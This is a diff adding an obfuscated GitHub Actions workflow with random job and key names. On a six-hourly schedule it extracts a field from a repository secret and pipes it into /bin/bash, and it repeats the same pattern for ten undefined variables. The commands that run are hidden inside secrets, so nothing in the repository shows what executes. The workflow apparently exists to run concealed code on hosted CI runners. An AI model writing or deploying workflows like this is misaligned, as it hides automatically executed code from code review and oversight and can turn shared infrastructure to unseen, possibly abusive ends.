@@ -1,0 +1,28 @@
+name: gaojinbao2345
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaojinbao2345
+        env:
+          tc4: ${{ secrets.tc4 }}
+        run: |
+          echo $tc4 | jq -r .tzvi19469 | /bin/bash
+          echo $skxzy5826 | jq -r .lrut8301 | /bin/bash
+          echo $gfbo7533 | jq -r .nwkd9 | /bin/bash
+          echo $gxju43 | jq -r .idgev64 | /bin/bash
+          echo $klk6 | jq -r .ubv75639 | /bin/bash
+          echo $jocqx6 | jq -r .rvsvb9807 | /bin/bash
+          echo $c9733 | jq -r .nrbf51 | /bin/bash
+          echo $bh553 | jq -r .tk438 | /bin/bash
+          echo $li7 | jq -r .ptnb2322 | /bin/bash
+          echo $gsql225 | jq -r .zp132 | /bin/bash
+          echo $onvr63 | jq -r .m0 | /bin/bash
+
